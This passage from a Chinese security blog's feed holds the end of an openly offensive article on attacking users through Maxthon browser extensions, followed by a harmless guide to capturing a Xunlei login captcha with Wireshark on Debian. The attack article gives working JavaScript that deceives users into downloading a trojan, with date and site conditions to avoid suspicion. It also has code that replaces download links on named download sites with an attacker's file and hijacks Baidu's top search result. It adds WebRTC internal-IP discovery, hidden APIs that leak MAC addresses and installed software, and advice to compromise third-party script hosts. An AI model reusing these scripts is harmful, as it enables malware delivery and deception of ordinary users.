rel="external">MxPacker</a>软件，进行的解密，首先分析<code>def.json</code>里的action字段下的js属性，指向的是哪个javascript文件。再进行分析，当然也可以使用其他软件对文件内容进行搜索，看里面是否存在’document.createElement’关键字。</p><p>找到后，接下来就是苦力活了，入侵这个第三方javascript所属的网站。入侵后再修改这个javascript文件，就行了。</p><h6 id="0x1-4-2-具有可视化页面"><a href="#0x1-4-2-具有可视化页面" class="headerlink" title="0x1.4.2 具有可视化页面"></a>0x1.4.2 具有可视化页面</h6><p>这个比上面0x1.4.1简单点，使用之前长短短在zone分享的代码就可以把这个页面所有第三方的javascript文件列举出来：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>,tags=<span class="built_in">document</span>.querySelectorAll(<span class="string">'iframe[src],frame[src],script[src],link[rel=stylesheet],object[data],embed[src]'</span>),tag;tag=tags[i];i++)&#123;</div><div class="line">  <span class="keyword">var</span> a = <span class="built_in">document</span>.createElement(<span class="string">'a'</span>);</div><div class="line">  a.href = tag.src||tag.href||tag.data;</div><div class="line">  <span class="keyword">if</span>(a.hostname!=location.hostname)&#123;</div><div class="line">    <span class="built_in">console</span>.warn(location.hostname+<span class="string">' 发现第三方资源['</span>+tag.localName+<span class="string">']:'</span>+a.href);</div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>使用方法如下：</p><p><img src="http://7xppwd.com1.z0.glb.clouddn.com/setup_plug/8.png" alt=""></p><p><img src="http://7xppwd.com1.z0.glb.clouddn.com/setup_plug/9.png" alt=""></p><p><img src="http://7xppwd.com1.z0.glb.clouddn.com/setup_plug/10.png" alt=""></p><p><img src="http://7xppwd.com1.z0.glb.clouddn.com/setup_plug/11.png" alt=""></p><p>使用的时候，会发现有的插件是调用了插件本身的javascript文件，或者其他baidu、360等第三方安全不容易被入侵的网站里的javascript代码，这个时候就比较费时费力了。</p><h5 id="0x1-4-3-控制插件里调用的第三方javascript代码总结"><a href="#0x1-4-3-控制插件里调用的第三方javascript代码总结" class="headerlink" title="0x1.4.3 控制插件里调用的第三方javascript代码总结"></a>0x1.4.3 控制插件里调用的第三方javascript代码总结</h5><p>这个方法较为繁琐，优点如下：</p><blockquote><p>不容易被发现</p><p>向上反查也比较难追踪</p></blockquote><p>缺点：</p><blockquote><p>费时费力</p><p>成功率较低</p></blockquote><p>此种方法适用于针对某一人或团体，只能获得其装的插件名称，当别无他法时使用此方法。</p><h4 id="0x2-那些隐藏的API："><a href="#0x2-那些隐藏的API：" class="headerlink" title="0x2 那些隐藏的API："></a>0x2 那些隐藏的API：</h4><hr><p>因为一些API获得的信息比较隐私，所以遨游官方没在在API手册里写。但是他们真实存在，我们可以在一个普通的页面里打开审查元素下的Console输入external来查看一些遨游官方隐藏的API。</p><p>还有一种是在插件页面的里专用API，插件里的API基本上每个版本上都会发生变化，下面是3.x版本的API：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">maxthon.system.Utility.getMacAddresses() <span class="comment">//获取用户的MAC地址</span></div><div class="line">maxthon.system.GraphicsEnvironment.getLocalGraphicsEnvironment().getAvailableFontFamilyNames() <span class="comment">//获取用户当前所有的字体文</span></div><div class="line">maxthon.system.GraphicsEnvironment.getLocalGraphicsEnvironment().getSystemFontName() <span class="comment">//用户当前应用的字体</span></div><div class="line">maxthon.io.File.createTempFile().name_ <span class="comment">//获取用户临时目录</span></div><div class="line">maxthon.io.File.createTempFile().isFile <span class="comment">//判断name_文件是否存在，但是这里我无法重新设置name_的值</span></div></pre></td></tr></table></figure></p><p>下面是最新版本4.x版本的API：</p><p>遨游把之前在maxthon对象下的函数、对象分离在其他地方了（其实还是有，不明白其用意）<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">mx.app.getAvatar()    <span class="comment">//获得当前登录用户的头像(data:image/png;base64格式)</span></div><div class="line">mx.app.login()    <span class="comment">//判断是否登录了遨游浏览器(登录返回true，没登陆返回false)</span></div><div class="line">mx.app.getProfile()    <span class="comment">//获得用户当前的状态(是否登录、uid、用户名称)</span></div><div class="line">mx.app.getSystemLocale()    <span class="comment">//获得系统语言(例如：zh-cn)</span></div><div class="line">mx.app.showUserPanel()    <span class="comment">//显示用户菜单(相当于点击左上角的头像)</span></div><div class="line"><span class="comment">//以上的代码需要事先运行mx.app.user()、mx.app.locale()</span></div><div class="line"></div><div class="line">clientInformation.plugins     <span class="comment">//浏览器支持的插件(可看到用户安装哪些软件)</span></div><div class="line">clientInformation.mimeTypes    <span class="comment">//列举出支持的application(可看到用户安装哪些软件)</span></div></pre></td></tr></table></figure></p><p>这里针对最后两个API截图看下：</p><p><img src="http://7xppwd.com1.z0.glb.clouddn.com/setup_plug/12.png" alt=""></p><p><img src="http://7xppwd.com1.z0.glb.clouddn.com/setup_plug/13.png" alt=""></p><p>这些东西写在插件里，获取用户安装了哪些软件轻而易举。基本上是没有隐私可言了。</p><h4 id="0x3-攻击向量："><a href="#0x3-攻击向量：" class="headerlink" title="0x3 攻击向量："></a>0x3 攻击向量：</h4><hr><p>普通的获取cookies我们就不说了，介绍点其他的。</p><p>上面介绍的都是针对浏览器插件对用户进行的攻击，但是攻击的平面都是浏览器。但是谁不想进一步控制用户的电脑权限呢。大致的思路如下：</p><blockquote><p>弹窗欺骗用户说需要下载软件，其实是木马程序</p><p>使用浏览器漏洞进行攻击</p><p>替换下载链接</p></blockquote><h5 id="0x3-1-弹窗欺骗用户下载软件"><a href="#0x3-1-弹窗欺骗用户下载软件" class="headerlink" title="0x3.1 弹窗欺骗用户下载软件"></a>0x3.1 弹窗欺骗用户下载软件</h5><p>这一步很简单，就是一些简单的javascript代码：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;    <span class="comment">//闭包函数，防止变量污染</span></div><div class="line">    alert(<span class="string">"请下载xxx安全插件保障您在此网站的安全"</span>);</div><div class="line">    location.href = <span class="string">"http://baidu.com/download/xxxx.exe"</span>;</div><div class="line">&#125;)()</div></pre></td></tr></table></figure></p><p>但是这里不能一直弹窗下载，不然肯定会引起怀疑的，下面我们来进行优化：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;    <span class="comment">//闭包函数，防止变量污染</span></div><div class="line">    <span class="keyword">var</span> downDate = <span class="keyword">new</span> <span class="built_in">Date</span>();  <span class="comment">//获取当前的时间</span></div><div class="line">    <span class="keyword">var</span> downDateY = <span class="built_in">String</span>(downDate).split(<span class="string">" "</span>)[<span class="number">3</span>]; <span class="comment">//年份</span></div><div class="line">    <span class="keyword">var</span> downDateM = <span class="built_in">String</span>(downDate).split(<span class="string">" "</span>)[<span class="number">1</span>]; <span class="comment">//月份</span></div><div class="line">    <span class="keyword">var</span> downDateD = <span class="built_in">String</span>(downDate).split(<span class="string">" "</span>)[<span class="number">2</span>]; <span class="comment">//日期</span></div><div class="line">    <span class="keyword">var</span> downDateT = <span class="built_in">String</span>(downDate).split(<span class="string">" "</span>)[<span class="number">4</span>].split(<span class="string">":"</span>);  <span class="comment">//时间</span></div><div class="line">    <span class="keyword">if</span>(location.href != <span class="string">"https://baidu.com/"</span>)&#123;  <span class="comment">//当不是百度时，不执行下面的代码</span></div><div class="line">        <span class="keyword">return</span> fasle;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">if</span>(downDateY == <span class="string">"2016"</span> &amp;&amp; downDateM == <span class="string">"Oct"</span> &amp;&amp; downDateD == <span class="string">"28"</span> &amp;&amp; downDateT[<span class="number">0</span>] == <span class="string">"21"</span> &amp;&amp; downDateT[<span class="number">1</span>] &lt; <span class="string">"30"</span>)&#123;</div><div class="line">        alert(<span class="string">"请下载xxx安全插件保障您在此网站的安全"</span>);</div><div class="line">        location.href = <span class="string">"http://baidu.com/download/xxxx.exe"</span>;</div><div class="line">    &#125;</div><div class="line">&#125;)()</div></pre></td></tr></table></figure></p><p>真正写的时候，不要像我这么写，我这样写是因为逻辑比较简单，但是代码量比较多。意思是说当当前网站是<code>https://baidu.com/</code>时再判断时间是否为2016年10月28号晚上9点到9点半之间，如果是则弹窗让用户下载木马程序。</p><h5 id="0x3-2-使用浏览器漏洞进行攻击"><a href="#0x3-2-使用浏览器漏洞进行攻击" class="headerlink" title="0x3.2 使用浏览器漏洞进行攻击"></a>0x3.2 使用浏览器漏洞进行攻击</h5><p>漏洞是要靠自己挖掘的，这里不再多说，大家可以去看一下Blast写的书籍《浏览器安全》。也可以看下之间黑哥写的PPT《去年跨过的浏览器》，之前maxthon就因为特殊域下的<code>mxCall</code>函数的问题，导致可以执行任意命令。大家可以挖挖看，总会有意想不到的收获。</p><h5 id="0x3-3-替换下载链接"><a href="#0x3-3-替换下载链接" class="headerlink" title="0x3.3 替换下载链接"></a>0x3.3 替换下载链接</h5><p>替换的话，我们需要先采集几个下载量比较大的下载站，我这里列举一下：</p><blockquote><p><a href="http://xiazai.zol.com.cn/" target="_blank" rel="external">ZOL下载-免费软件,绿色软件</a></p><p><a href="http://www.skycn.com/" target="_blank" rel="external">天空下载站</a></p><p><a href="http://www.onlinedown.net/" target="_blank" rel="external">华军软件园</a></p><p><a href="http://www.skycn.net/" target="_blank" rel="external">hao123下载站</a></p><p><a href="http://dl.pconline.com.cn/" target="_blank" rel="external">太平洋下载中心</a></p><p><a href="http://rj.baidu.com/" target="_blank" rel="external">百度软件中心</a></p></blockquote><p>还有很多，这里就不在列举了，下面我们就根据这些下载站来写替换的javascript代码。<br>先写段代码，让他判断当前的网址是否为下载站<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div></pre></td><td class="code"><pre><div class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</div><div class="line">    <span class="keyword">var</span> downloadWebsite = [</div><div class="line">        <span class="string">'http://xiazai.zol.com.cn'</span>,</div><div class="line">        <span class="string">'http://www.skycn.com'</span>,</div><div class="line">        <span class="string">'http://www.onlinedown.net'</span>,</div><div class="line">        <span class="string">'http://dl.pconline.com.cn'</span>,</div><div class="line">        <span class="string">'http://rj.baidu.com'</span></div><div class="line">    ];  <span class="comment">//要替换的下载站url地址</span></div><div class="line">    <span class="keyword">var</span> replaceDownloadUrl = <span class="string">"http://xxxx.com/download/soft.rar"</span>;   <span class="comment">//要替换的下载软件</span></div><div class="line">    <span class="keyword">switch</span>(location.origin)&#123;  <span class="comment">//对当前的url进判断，是否为下载站，如果是则进入其操作函数里</span></div><div class="line">        <span class="keyword">case</span> downloadWebsite[<span class="number">0</span>]:</div><div class="line">            <span class="keyword">var</span> download1 = <span class="built_in">document</span>.getElementById(<span class="string">"downloadTop"</span>);</div><div class="line">            <span class="keyword">var</span> download2 = <span class="built_in">document</span>.querySelectorAll(<span class="string">".down-alink a"</span>);</div><div class="line">            <span class="keyword">var</span> download3 = <span class="built_in">document</span>.querySelectorAll(<span class="string">".down-alink01 a"</span>);</div><div class="line">            <span class="keyword">if</span>(download1 != <span class="literal">null</span> &amp;&amp; download2.length != <span class="number">0</span> &amp;&amp; download3.length != <span class="number">0</span>)&#123;</div><div class="line">                download1.href = replaceDownloadUrl;</div><div class="line">                <span class="keyword">for</span>(<span class="keyword">var</span> j = <span class="number">0</span>;j &lt; download2.length;j++)&#123;</div><div class="line">                    download2[j].href = replaceDownloadUrl;</div><div class="line">                &#125;</div><div class="line">                <span class="keyword">for</span>(<span class="keyword">var</span> k = <span class="number">0</span>;k &lt; download3.length;k++)&#123;</div><div class="line">                    download3[k].href = replaceDownloadUrl;</div><div class="line">                &#125;</div><div class="line">            &#125;</div><div class="line">        <span class="keyword">break</span>;</div><div class="line">        <span class="keyword">case</span> downloadWebsite[<span class="number">1</span>]:</div><div class="line">            <span class="keyword">var</span> download1 = <span class="built_in">document</span>.querySelectorAll(<span class="string">".ul_Address li a"</span>);</div><div class="line">            <span class="keyword">if</span>(download1.length != <span class="number">0</span>)&#123;</div><div class="line">                <span class="keyword">for</span>(<span class="keyword">var</span> j = <span class="number">0</span>;j &lt; download1.length;j++)&#123;</div><div class="line">                    download1[j].href = replaceDownloadUrl;</div><div class="line">                &#125;</div><div class="line">            &#125;</div><div class="line">        <span class="keyword">break</span>;</div><div class="line">        <span class="keyword">case</span> downloadWebsite[<span class="number">2</span>]:</div><div class="line">            <span class="keyword">var</span> download1 = <span class="built_in">document</span>.querySelectorAll(<span class="string">".softinfoBox .meg a"</span>);</div><div class="line">            <span class="keyword">var</span> download2 = <span class="built_in">document</span>.querySelectorAll(<span class="string">".downDz a"</span>);;</div><div class="line">            <span class="keyword">if</span>(download1.length != <span class="number">0</span> &amp;&amp; download2.length != <span class="number">0</span>)&#123;</div><div class="line">                download1[<span class="number">0</span>].href = replaceDownloadUrl;</div><div class="line">                <span class="keyword">for</span>(<span class="keyword">var</span> j = <span class="number">0</span>;j &lt; download2.length;j++)&#123;</div><div class="line">                    download2[j].href = replaceDownloadUrl;</div><div class="line">                &#125;</div><div class="line">            &#125;</div><div class="line">        <span class="keyword">break</span>;</div><div class="line">        <span class="keyword">case</span> downloadWebsite[<span class="number">3</span>]:</div><div class="line">            <span class="keyword">var</span> download1 = <span class="built_in">document</span>.querySelectorAll(<span class="string">".dlLinks-a a"</span>);</div><div class="line">            <span class="keyword">if</span>(download1.length != <span class="number">0</span>)&#123;</div><div class="line">                <span class="keyword">for</span>(<span class="keyword">var</span> j = <span class="number">0</span>;j &lt; download1.length;j++)&#123;</div><div class="line">                    download1[j].href = replaceDownloadUrl;</div><div class="line">                &#125;</div><div class="line">            &#125;</div><div class="line">        <span class="keyword">break</span>;</div><div class="line">        <span class="keyword">case</span> downloadWebsite[<span class="number">4</span>]:</div><div class="line">            <span class="keyword">var</span> download1 = <span class="built_in">document</span>.querySelectorAll(<span class="string">".fast_download"</span>);</div><div class="line">            <span class="keyword">var</span> download2 = <span class="built_in">document</span>.querySelectorAll(<span class="string">".normal_download"</span>);</div><div class="line">            <span class="keyword">if</span>(download1.length != <span class="number">0</span> &amp;&amp; download2.length != <span class="number">0</span>)&#123;</div><div class="line">                download1[<span class="number">0</span>].href = replaceDownloadUrl;</div><div class="line">                download2[<span class="number">0</span>].href = replaceDownloadUrl;</div><div class="line">            &#125;</div><div class="line">        <span class="keyword">break</span>;</div><div class="line">    &#125;</div><div class="line">&#125;)()</div></pre></td></tr></table></figure></p><h5 id="0x3-4-修改百排名"><a href="#0x3-4-修改百排名" class="headerlink" title="0x3.4 修改百排名"></a>0x3.4 修改百排名</h5><p>想做SEO的，可以使用此方法：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</div><div class="line">    <span class="keyword">if</span>(location.origin == <span class="string">"https://www.baidu.com"</span> &amp;&amp; location.pathname == <span class="string">"/s"</span>)&#123;    <span class="comment">//当时百度的搜索页面时</span></div><div class="line">        <span class="built_in">document</span>.querySelectorAll(<span class="string">"#content_left h3 a"</span>)[<span class="number">0</span>].href = <span class="string">"http://360.cn/"</span>; <span class="comment">//替换第一个搜索结果为指定的url地址</span></div><div class="line">    &#125;</div><div class="line">&#125;)()</div></pre></td></tr></table></figure></p><h5 id="0x3-4-内网嗅探"><a href="#0x3-4-内网嗅探" class="headerlink" title="0x3.4 内网嗅探"></a>0x3.4 内网嗅探</h5><p>这个方法的篇幅比较多，放在下一章说明。下面是利用WebRTC来实现的获取内网IP地址：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> ipList = [];</div><div class="line"><span class="keyword">var</span> webrtcxss = &#123;</div><div class="line">    <span class="attr">webrtc</span>        : <span class="function"><span class="keyword">function</span>(<span class="params">callback</span>)</span>&#123;</div><div class="line">        <span class="keyword">var</span> ip_dups           = &#123;&#125;;</div><div class="line">        <span class="keyword">var</span> RTCPeerConnection = <span class="built_in">window</span>.RTCPeerConnection || <span class="built_in">window</span>.mozRTCPeerConnection || <span class="built_in">window</span>.webkitRTCPeerConnection;</div><div class="line">        <span class="keyword">var</span> mediaConstraints  = &#123;</div><div class="line">            <span class="attr">optional</span>: [&#123;<span class="attr">RtpDataChannels</span>: <span class="literal">true</span>&#125;]</div><div class="line">        &#125;;</div><div class="line">        <span class="keyword">var</span> servers = <span class="literal">undefined</span>;</div><div class="line">        <span class="keyword">if</span>(<span class="built_in">window</span>.webkitRTCPeerConnection)&#123;</div><div class="line">            servers = &#123;<span class="attr">iceServers</span>: []&#125;;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">var</span> pc = <span class="keyword">new</span> RTCPeerConnection(servers, mediaConstraints);</div><div class="line">        pc.onicecandidate = <span class="function"><span class="keyword">function</span>(<span class="params">ice</span>)</span>&#123;</div><div class="line">            <span class="keyword">if</span>(ice.candidate)&#123;</div><div class="line">                <span class="keyword">var</span> ip_regex        = <span class="regexp">/([0-9]&#123;1,3&#125;(\.[0-9]&#123;1,3&#125;)&#123;3&#125;)/</span>;</div><div class="line">                <span class="keyword">var</span> ip_addr         = ip_regex.exec(ice.candidate.candidate)[<span class="number">1</span>];</div><div class="line">                <span class="keyword">if</span>(ip_dups[ip_addr] === <span class="literal">undefined</span>)</div><div class="line">                callback(ip_addr);</div><div class="line">                ip_dups[ip_addr]    = <span class="literal">true</span>;</div><div class="line">            &#125;</div><div class="line">        &#125;;</div><div class="line">        pc.createDataChannel(<span class="string">""</span>);</div><div class="line">        pc.createOffer(<span class="function"><span class="keyword">function</span>(<span class="params">result</span>)</span>&#123;</div><div class="line">            pc.setLocalDescription(result, <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;&#125;);</div><div class="line">        &#125;);</div><div class="line">    &#125;,</div><div class="line">    <span class="attr">getIp</span>        : <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</div><div class="line">        <span class="keyword">this</span>.webrtc(<span class="function"><span class="keyword">function</span>(<span class="params">ip</span>)</span>&#123;</div><div class="line">            <span class="built_in">console</span>.log(ip)</div><div class="line">        &#125;);</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line">webrtcxss.getIp();</div></pre></td></tr></table></figure></p><p>大家可以根据这个方法来想想有没有办法来实现一些更好玩的思路。</p><h4 id="0x4-结言："><a href="#0x4-结言：" class="headerlink" title="0x4 结言："></a>0x4 结言：</h4><hr><p>还有很多的API及攻击方法等待大家去发掘，我能做的就是给大家打开一个新的攻击平面，不用再局限那些已经熟悉的方法了。</p><blockquote><p>Author:Black-Hole</p><p>Blog：<a href="http://bugs.cc">http://bugs.cc</a></p><p>github:<a href="https://github.com/BlackHole1/" target="_blank" rel="external">https://github.com/BlackHole1/</a></p><p>Twitter:<a href="https://twitter.com/Free_BlackHole" target="_blank" rel="external">https://twitter.com/Free_BlackHole</a></p><p>Email:158blackhole@gmail.com</p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;0x0-前言：&quot;&gt;&lt;a href=&quot;#0x0-前言：&quot; class=&quot;headerlink&quot; title=&quot;0x0 前言：&quot;&gt;&lt;/a&gt;0x0 前言：&lt;/h4&gt;&lt;hr&gt;
&lt;p&gt;我在很多地方都有说“浏览器插件的攻击方法”，本篇文章就带大家深入的研究一下“由浏览器插件引发的攻击手法及攻击代码”。本篇文章说的内容，可以给大家打开一个新的攻击思路，做APT攻击的话也会有奇效。&lt;/p&gt;
&lt;h4 id=&quot;0x1-让自己变成攻击者：&quot;&gt;&lt;a href=&quot;#0x1-让自己变成攻击者：&quot; class=&quot;headerlink&quot; title=&quot;0x1 让自己变成攻击者：&quot;&gt;&lt;/a&gt;0x1 让自己变成攻击者：&lt;/h4&gt;&lt;hr&gt;
&lt;p&gt;我之前在群里问了一下，发现很多人都只是听说过，虽然知道原理。但是没有进行实践并且小瞧了这个攻击方式。而且这个攻击手法的案例也是少的可怜。没有攻何来守，之前chrome有过类似的攻击手法，但是攻击代码所做的事比较少，于是本篇我们先成为攻击者，站在攻击者的角度来研究这个攻击手法。之前我在介绍这个攻击手法的时候都是在文章里开一个小节来说的。现在我专门来为这个攻击方法写篇文章，也希望让大家重视起来。&lt;/p&gt;
&lt;p&gt;在大家的理解里，浏览器插件攻击就是在插件里植入javascript代码，做一些盗取cookies的事情，但是事情远没有那么简单。&lt;/p&gt;
&lt;p&gt;大家都知道进行“浏览器插件攻击”就需要用户安装了你的插件。大家也都认为只有这一种方法，但是事实并非如此，下面是4种安装插件的方法：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;在页面里欺骗用户，写上“如想浏览此页面，请去下载某某插件”&lt;/p&gt;
&lt;p&gt;被动等待，类似：姜太公钓鱼愿者上钩的感觉，插件就在那，你不安装总会有人安装&lt;/p&gt;
&lt;p&gt;基于社工库控制插件作者的账户，加入后门代码，更新插件&lt;/p&gt;
&lt;p&gt;控制插件里调用的第三方javascript代码&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;现在有四种方法供我们选择，我们一个个来进行介绍。&lt;br&gt;
    
    </summary>
    
    
      <category term="WEB安全" scheme="http://bugs.cc/tags/WEB%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>在debian下如何使用迅雷登陆账号</title>
    <link href="http://bugs.cc/2016/08/24/%E5%9C%A8debian%E4%B8%8B%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8%E8%BF%85%E9%9B%B7%E7%99%BB%E9%99%86%E8%B4%A6%E5%8F%B7/"/>
    <id>http://bugs.cc/2016/08/24/在debian下如何使用迅雷登陆账号/</id>
    <published>2016-08-24T05:08:47.000Z</published>
    <updated>2016-08-24T06:24:40.734Z</updated>
    
    <content type="html"><![CDATA[<blockquote><h3 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h3></blockquote><p>今天在QQ空间看到有人分享了“惊天魔盗团2”的电影资源</p><p><img src="http://7xppwd.com1.z0.glb.clouddn.com//debian-xunlei-vip-down/vm1.png" alt=""></p><p>正好这几天被mongoose搞的有点烦，想看会电影放松一下心情，但是代码还是要写的，于是我想把电影下载下来，然后等bug解决了，再看。所以问题来了。<br><a id="more"></a></p><blockquote><h3 id="下载迅雷："><a href="#下载迅雷：" class="headerlink" title="下载迅雷："></a>下载迅雷：</h3></blockquote><p>可能是我们这边地区的问题，在迅雷官网下载的迅雷都很慢，于是使用“百度管家”下载。<a href="http://112.29.142.181/sw.bos.baidu.com/sw-search-sp/software/66cfb7c33b400/Thunder_9.0.12.332_baidu.exe" target="_blank" rel="external">fuck me down XunLei</a></p><blockquote><h3 id="环境搭建："><a href="#环境搭建：" class="headerlink" title="环境搭建："></a>环境搭建：</h3></blockquote><p>就是用wine来使用exe程序，这里不介绍，请自己百度</p><blockquote><h3 id="安装注意事项："><a href="#安装注意事项：" class="headerlink" title="安装注意事项："></a>安装注意事项：</h3></blockquote><p>不要使用<code>sudo wine Thunder_9.0.12.332_baidu.exe</code>，请使用<code>wine Thunder_9.0.12.332_baidu.exe</code>，不然你的迅雷会被安装到root用户下</p><blockquote><h3 id="如何启动"><a href="#如何启动" class="headerlink" title="如何启动"></a>如何启动</h3></blockquote><p>迅雷安装好后，会在你的桌面放一个快捷方式。如果没有，请像我这么做：</p><ol><li><p><code>cd ~/.wine/drive_c/Program\ Files\ \(x86\)/Thunder\ Network/Thunder9/Program/</code></p></li><li><p><code>wine Thunder.exe</code></p></li></ol><p>然后，他就启动成功了。</p><p>就像这样：</p><p><img src="http://7xppwd.com1.z0.glb.clouddn.com//debian-xunlei-vip-down/vm2.png" alt=""></p><blockquote><h3 id="为什么会出现黑色的框框呢？"><a href="#为什么会出现黑色的框框呢？" class="headerlink" title="为什么会出现黑色的框框呢？"></a>为什么会出现黑色的框框呢？</h3></blockquote><p>黑色的框框是个浏览器，迅雷自带的XBrowser浏览器。个人猜测是因为dll的问题，等我有时间的时候，我去找台window电脑，看一下这个浏览器以来上面dll。这个浏览器无所谓的，没有他照样下载。</p><blockquote><h3 id="登陆"><a href="#登陆" class="headerlink" title="登陆"></a>登陆</h3></blockquote><p>重点来了，点击登陆时，会让你输入账号密码</p><p><img src="http://7xppwd.com1.z0.glb.clouddn.com//debian-xunlei-vip-down/vm3.png" alt=""></p><p>但是你会发现，你输入的字符串没有显示，不用慌，就像linux终端输入密码时一样，其实你输入了，只是不可见而已。然后就可以登陆了。但是有时候会出现让你填写验证码的框。</p><p><img src="http://7xppwd.com1.z0.glb.clouddn.com//debian-xunlei-vip-down/vm4.png" alt=""></p><p>于是你会蛋疼的发现，验证码去吃屎了。所以现在我们就来解决这个问题。先想象一下验证码的特性。当我点击“看不清，换一张”的时候，那么一定会发送一个数据包。然后返回新的验证码数据包，我们只需要截取这个数据就行了。这里我使用wireshark来进行抓包。</p><p>debian安装wireshark，需要添加kali的源，然后<code>sudo apt-get update&amp;&amp;sudo apt-get install wireshark</code>就行了。记得使用<code>sudo wireshark</code>来运行</p><p><img src="http://7xppwd.com1.z0.glb.clouddn.com//debian-xunlei-vip-down/vm5.png" alt=""></p><p>我这里的网卡是wlan0，有可能不一样，选一个你觉得是对的就行了，如果你还是不知道。对不起，请你出去，本节课不准提问。</p><p>然后你就看到比粪池里的屎还多的数据包</p><p><img src="http://7xppwd.com1.z0.glb.clouddn.com//debian-xunlei-vip-down/vm6.png" alt=""></p><p>这个时候我们在Filter里填写<code>http&amp;&amp; http contains &quot;image/jpeg&quot;</code></p><p>然后打开迅雷，登陆。当出现验证码验证的时候再次切换到wireshark看就行了。</p><p><img src="http://7xppwd.com1.z0.glb.clouddn.com//debian-xunlei-vip-down/vm7.png" alt=""></p><p>选中（就是让它的背景色变成蓝色，单击）</p><p>然后File-&gt;Export Objects-&gt;HTTP</p><p><img src="http://7xppwd.com1.z0.glb.clouddn.com//debian-xunlei-vip-down/vm8.png" alt=""></p><p>选中地址是<code>verify2.xunlei.com</code>且Content Type为<code>image/jpeg</code>选中后，点击另存为xx.jpg。</p><p><img src="http://7xppwd.com1.z0.glb.clouddn.com//debian-xunlei-vip-down/vm9.png" alt=""></p><p><img src="http://7xppwd.com1.z0.glb.clouddn.com//debian-xunlei-vip-down/vm10.png" alt=""></p><p><img src="http://7xppwd.com1.z0.glb.clouddn.com//debian-xunlei-vip-down/vm11.png" alt=""></p><p>拿验证码登陆就行了。</p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;h3 id=&quot;前言：&quot;&gt;&lt;a href=&quot;#前言：&quot; class=&quot;headerlink&quot; title=&quot;前言：&quot;&gt;&lt;/a&gt;前言：&lt;/h3&gt;&lt;/blockquote&gt;
&lt;p&gt;今天在QQ空间看到有人分享了“惊天魔盗团2”的电影资源&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://7xppwd.com1.z0.glb.clouddn.com//debian-xunlei-vip-down/vm1.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
